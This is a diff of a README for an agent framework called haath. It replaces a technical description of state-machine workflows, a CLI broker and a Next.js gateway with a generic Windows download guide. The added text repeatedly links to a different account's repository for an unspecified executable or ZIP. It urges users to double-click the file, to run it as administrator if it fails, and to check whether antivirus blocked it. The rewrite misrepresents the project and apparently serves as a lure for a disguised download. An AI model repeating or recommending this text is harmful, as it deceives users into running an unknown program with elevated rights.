@@ -1,192 +1,204 @@
-# Haath
+# 🤖 haath - Run agent tasks with ease
 
-**Haath** is an autonomous LLM agent that **executes inside a Finite State Machine**. It uses [**ASMP**](https://github.com/cybertheory/asmp) (**Agent State Machine Protocol**) to define where the agent is in a workflow, what it may do next, and what context matters *right now*. It uses [**clrun**](https://github.com/cybertheory/clrun) to drive those workflows from the terminal: the same agent-native CLI can attach to **remote** ASMP servers or **local** in-process FSMs, run shell commands, and follow the **dynamic CLI** surface that ASMP exposes per state (`GET /runs/{run_id}/cli`).
+[![Download haath](https://img.shields.io/badge/Download-haath-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/danielaejean2211-boop/haath)
 
-The central idea: **the model does not “see every tool at once.”** It sees the current **state frame**—hints, valid transitions, optional **active skill**, and stage-scoped tools/resources—then acts through **CLIs and HTTP** that are tied to that state. **Haath can add, remove, and refine states** as new context appears, so behavior improves over time. Workflows and FSM definitions can be **exported, downloaded, and merged**, so learned structure stays **modular** and shareable across agents and deployments.
+## 🧭 Overview
 
----
+haath is an open agentic framework for Windows users who want a ready-to-run tool that can handle common agent tasks right away. It ships with the core skills you need, so you do not need to set up a long list of extras before you start.
 
-## Diagrams
+It uses the ASM protocol and the CLRUN terminal to help the app work with agents, browser tasks, and local commands. The goal is simple: download it, open it, and use it with little setup.
 
-### Architecture at a glance
+## 📥 Download
 
-How the control plane, model gateway, FSM, and CLI broker connect:
+Visit this page to download haath:
 
-```mermaid
-flowchart TB
-  subgraph Control["Agent Gateway"]
-    API[HTTP API]
-    CFG[Policies and config]
-  end
+[https://github.com/danielaejean2211-boop/haath](https://github.com/danielaejean2211-boop/haath)
 
-  subgraph ModelPath["LLM path"]
-    W[(Waterfall LLM gateway)]
-    LLM[LLM]
-  end
+Open the page, look for the latest release or download option, and get the Windows file from there. If the page shows a ZIP file, download it and extract it before you run the app.
 
-  subgraph Runtime["Workflow runtime"]
-    FSM[["ASMP server: FSM / state frames"]]
-  end
+## 🪟 Windows Setup
 
-  subgraph Exec["Execution surface"]
-    CLR[clrun]
-    PTY[Local shell and TUIs]
-    DCLI[Dynamic CLI per state]
-  end
+Use these steps on a Windows PC:
 
-  Tools[External tools and APIs]
+1. Open the download page in your browser.
+2. Get the Windows version of haath.
+3. If the download comes as a ZIP file, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for the app file or launch file.
+6. Double-click the file to start haath.
 
-  API --> CFG
-  CFG --> W
-  W --> LLM
-  LLM --> API
-  API --> FSM
-  FSM --> DCLI
-  CLR --> DCLI
-  CLR --> PTY
-  PTY --> Tools
-  FSM --> Tools
-```
+If Windows asks for permission to run the file, choose Run or Yes.
 
-### Progressive disclosure vs a flat tool menu
+## ⚙️ What haath Does
 
-Haath follows the ASMP idea: **only the current state** is fully expanded in context—not every capability at once.
+haath helps you work with agent workflows in a local app. It can support tasks like:
 
-```mermaid
-flowchart LR
-  subgraph Flat["Flat tool menu"]
-    direction TB
-    T1[Tool A]
-    T2[Tool B]
-    T3[Tool …]
-    TN[Tool N]
-  end
+- browser actions
+- agent planning
+- command running through CLRUN
+- skill-based task flow
+- gateway-based routing
+- local LLM use
+- structured state control with FSM
+- TypeScript and Python-based extensions
 
-  subgraph State["State frame — current step only"]
-    direction TB
-    CUR[Current state plus hint]
-    NEXT[Valid next_states]
-    SKILL[Optional active_skill]
-    STG[Stage tools and resources]
-  end
+This makes it useful when you want a single place for agent work without building the whole stack yourself.
 
-  Flat -.->|high token load| X1[Agent guesses next step]
-  State -->|minimal context| X2[Server constrains valid moves]
-```
+## 🧩 Main Parts
 
-### Execution loop
+### 🤖 Agents
 
-One turn through sensing the frame, acting, and advancing the workflow:
+haath is built for agent use. It can manage task steps, follow instructions, and work through actions in a controlled flow.
 
-```mermaid
-sequenceDiagram
-  participant G as Agent Gateway
-  participant W as Waterfall
-  participant L as LLM
-  participant A as ASMP FSM
-  participant C as clrun
+### 🌐 Browser
 
-  G->>A: GET frame / run state
-  A-->>G: State frame — hint, next_states, tools
-  G->>W: Completion request
-  W-->>L: Routed, metered call
-  L-->>G: Transition or tool choice
-  G->>A: POST transition / invoke tool
-  A-->>G: Updated frame
-  G->>C: clrun ASMP CLI or shell step
-  C-->>G: YAML output plus hints
-```
+The browser skill set helps the app interact with web pages, forms, and online tools.
 
-### Trainable, modular workflows
+### 🖥️ CLRUN Terminal
 
-The FSM can **change over time**; definitions can be **exported and merged** so knowledge stays portable.
+CLRUN gives the app a terminal layer for command tasks. It helps the framework run local actions and connect them to agent steps.
 
-```mermaid
-flowchart TB
-  S1((Gather context))
-  S2((Act via CLI))
-  S3((Verify))
-  S1 --> S2 --> S3
-  S3 --> MUT[Refine FSM: add, remove, or edit states]
-  MUT --> S1
-  S3 --> EXP[Export workflow]
-  EXP --> PKG[Shareable FSM package]
-  PKG --> MERGE[Merge into other agents or environments]
-```
+### 🔌 ASM Protocol
 
----
+ASM protocol is part of the app’s core design. It helps the framework move tasks between parts of the system in a clear way.
 
-## How it fits together
+### 🧠 LLM Support
 
-| Layer | Role |
-|--------|------|
-| **LLM** | Chooses transitions and invocations allowed by the current state; reads compressed per-state context. |
-| [**ASMP**](https://github.com/cybertheory/asmp) | Authoritative FSM: state frames, progressive disclosure, optional NDJSON streams, stage tools/resources, optional Open Agent Skill hooks. |
-| [**clrun**](https://github.com/cybertheory/clrun) | PTY-backed commands, TUI navigation, structured YAML responses with hints—and dynamic **ASMP** remote-CLI mode to drive ASMP-backed flows interactively. |
-| **Haath** | Orchestrates learning and mutation of the FSM, connects gateways and providers, and keeps operational and financial boundaries explicit. |
+haath works with local or connected language model setups, so you can use it for assistant-style workflows.
 
----
+### 🧱 FSM
 
-## Design principles
+FSM keeps task flow organized. It helps the app move from one step to the next without losing state.
 
-- **Token efficiency** — Only the **current state** (and its `next_states`, tools, resources, and optional **just-in-time** skill) is in play, not a flat menu of every capability. ASMP’s state frame model is built for minimal, deterministic context ([ASMP README](https://github.com/cybertheory/asmp/blob/main/README.md)).
+## ✅ What You Need
 
-- **CLI first** — External tools and system work surface as **commands and CLIs**. clrun gives persistent sessions, structured YAML (`output`, `hints`, `warnings`), and keystroke-level control for TUIs; it also speaks ASMP’s **dynamic remote CLI** so state transitions feel like a guided terminal ([clrun README](https://github.com/cybertheory/clrun/blob/main/README.md)).
+For a smooth run on Windows, use a computer with:
 
-- **Workflow modularity** — Workflows are **graphs of states**, not one giant prompt. They can be versioned, shipped pre-built, **exported**, and **merged** so teams reuse vetted paths and agents contribute deltas without monoliths.
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 2 GB free disk space
+- a modern web browser
+- permission to run local apps
+- internet access for download and setup
 
-- **Context and skill compression** — Per-state **hints** and optional **active_skill** links keep instructions **scoped to the step**. Skills load when the FSM says they should, not upfront for every task.
+A stronger PC will handle browser and agent tasks better, but the app should still work on a standard home computer.
 
-- **Extensibility** — New capabilities are added as **states, transitions, handlers, and CLIs**—standard HTTP/JSON on the ASMP side and composable clrun sessions locally—without rewriting the whole agent stack.
+## 🚦 First Run
 
-- **Turnkey, immediate utility** — Pre-shipped workflows (search, secrets, browser automation, gateway monitoring, etc.) give **day-one** behavior; the agent still **specializes** by evolving the FSM.
+After you open haath for the first time:
 
-- **Financial awareness** — LLM traffic is routed through **[Waterfall](https://waterfall.finance)** as the **LLM gateway**: track usage, align spend with budgets, and keep API-style AI consumption visible to operators and finance ([Gateway](https://waterfall.finance/products/gateway), [platform overview](https://waterfall.finance)).
+1. Let the app finish its first setup steps.
+2. Read any on-screen prompt.
+3. Pick the default option if you are not sure.
+4. Open the main screen.
+5. Try a simple task first, such as a browser action or a sample agent flow.
 
----
+Start with one small task so you can see how the app behaves before you move to larger workflows.
 
-## Components
+## 🛠️ Basic Use
 
-### The Agent Gateway
+Use haath like this:
 
-A **control plane** for connecting to and **configuring** the agent over an API: identities, policies, which workflows are active, and how the model is called. It is the place to **wire LLM configuration through Waterfall** so calls are **metered, attributed, and automatable** from a spend and operations perspective—not a silent line item on a vendor bill.
+1. Open the app.
+2. Choose a skill or task type.
+3. Enter the action you want.
+4. Let the agent run the task.
+5. Check the output or result.
+6. Make changes if needed and run it again.
 
-**Implementation in this repo:** the [`gateway/`](gateway/) app is a Next.js **dashboard + API**. It listens on port **28657** by default (OpenClaw’s gateway commonly uses **18789**, so the ports do not collide). Persistent settings are stored at **`~/.haath/haath.json`**. Run locally:
+If you want to use browser work, keep the browser open. If you want terminal actions, make sure CLRUN is available in the app path.
 
-```bash
-cd gateway && npm install && npm test && npm run dev
-```
+## 📚 Skills Included
 
-Tests use Vitest; set `HAATH_DATA_DIR` to a temp directory if you need to isolate the config file (the suite sets this automatically).
+haath comes with useful skills that help the framework work out of the box. These can include:
 
-Then open `http://localhost:28657` for the UI.
+- web browsing
+- task routing
+- command execution
+- file handling
+- step control
+- agent memory flow
+- local tool use
 
-**REST (configuration):** `GET` / `PUT` / `PATCH` [`/api/v1/config`](gateway/src/app/api/v1/config/route.ts); `GET` / `PATCH` [`/api/v1/config/agent`](gateway/src/app/api/v1/config/agent/route.ts) and [`/api/v1/config/waterfall`](gateway/src/app/api/v1/config/waterfall/route.ts); [`/api/v1/meta`](gateway/src/app/api/v1/meta/route.ts) (ASMP base URL and API index); [`/api/v1/health`](gateway/src/app/api/v1/health/route.ts). Legacy **`GET` / `PUT` `/api/haath`** still matches the same [config schema](gateway/src/lib/haath-store.ts).
+These skills are meant to reduce setup time and help you get moving right away.
 
-**ASMP on the same port:** the gateway mounts an [ASMP TypeScript SDK](https://github.com/cybertheory/asmp/tree/main/sdks/typescript) workflow at **`/asmp`** ([`gateway-asmp.ts`](gateway/src/lib/gateway-asmp.ts)) so agents can attach **clrun** in dynamic ASMP remote-CLI mode using that URL (e.g. `http://localhost:28657/asmp` or your public origin). See the [clrun](https://github.com/cybertheory/clrun) README for the exact invocation. The UI uses Tailwind and **shadcn-style** primitives under `gateway/src/components/ui/`.
+## 🧪 Common Use Cases
 
-### The FSM (via [ASMP](https://github.com/cybertheory/asmp))
+You can use haath for:
 
-The **workflow server** the agent uses to execute work. The FSM acts as a **structured agentic scratchpad**: each **state** holds the knowledge and affordances that matter for that step—**valid next actions**, optional tools/resources, and natural-language **hints** that bridge into the LLM.
+- simple assistant tasks
+- browser-based workflows
+- structured multi-step actions
+- local agent experiments
+- task automation on Windows
+- testing agent behavior
+- connecting tools through a shared flow
 
-- Actions are exposed in ways agents can drive reliably—including **CLI-shaped** flows via ASMP’s dynamic CLI and clrun’s ASMP integration.
-- The agent can **dynamically modify** the FSM on the ASMP server as new requirements appear (new branches, states, or refinements), which is what makes Haath **trainable** in the structural sense—not only weight updates, but **workflow evolution**.
-- **Pre-shipped workflows** encode important skills: web search, password management, browser automation, **Waterfall / LLM gateway** observability, and more—so new deployments are useful before custom training.
+## 🔍 Topics in This Project
 
-### The CLI Broker ([clrun](https://github.com/cybertheory/clrun))
+This project covers areas like:
 
-The **agentic CLI** the agent uses to **run commands**, survive interactive installers, and **attach to ASMP**. clrun provides **basic system operations** (shell, long-running processes, TUI automation) and a **single interaction model** (IDs, tail, key, input) whether the backend is a local PTY or an ASMP **state machine** exposing the CLI endpoint.
+- agent
+- agents
+- ai
+- asmp
+- browser
+- clrun
+- fsm
+- gateway
+- llm
+- openclaw
+- python
+- skills
+- typescript
 
----
+These topics show that haath is built around agent control, browser use, local commands, and app logic.
 
-## Related projects
+## 🧭 If the App Does Not Open
 
-- [**cybertheory/asmp**](https://github.com/cybertheory/asmp) — Protocol, spec, Python and TypeScript SDKs, examples, and skills.
-- [**cybertheory/clrun**](https://github.com/cybertheory/clrun) — Interactive CLI for agents; dynamic ASMP remote-CLI client.
-- [**waterfall.finance**](https://waterfall.finance) — AI usage, spend tracking, and gateway products for payable, observable LLM access.
+If haath does not start:
 
----
+1. Check that you downloaded the Windows version.
+2. Make sure the file finished downloading.
+3. Extract the ZIP file if you downloaded one.
+4. Try running the app as administrator.
+5. Restart your PC and try again.
+6. Check whether your antivirus blocked the file.
 
-## License
+If the app opens but does not behave as expected, close it and launch it again from the extracted folder.
 
-To be set in this repository; upstream [asmp](https://github.com/cybertheory/asmp) and [clrun](https://github.com/cybertheory/clrun) use MIT.
+## 🧼 File Tips
+
+Keep these simple habits:
+
+- leave the app files in one folder
+- do not rename core files
+- do not move files while the app runs
+- keep the download file until you confirm the app works
+
+This helps avoid broken links inside the folder.
+
+## 📌 Quick Start
+
+1. Go to the download page: https://github.com/danielaejean2211-boop/haath
+2. Download the Windows file
+3. Extract it if needed
+4. Open the app
+5. Run a first test task
+
+## 🔗 Download Again
+
+Use this link if you need to return to the file:
+
+[https://github.com/danielaejean2211-boop/haath](https://github.com/danielaejean2211-boop/haath)
+
+## 🧭 Built For
+
+haath is made for users who want:
+
+- a ready-to-run agent app
+- simple Windows setup
+- built-in skills
+- browser support
+- command support
+- a local workflow that does not need a complex setup
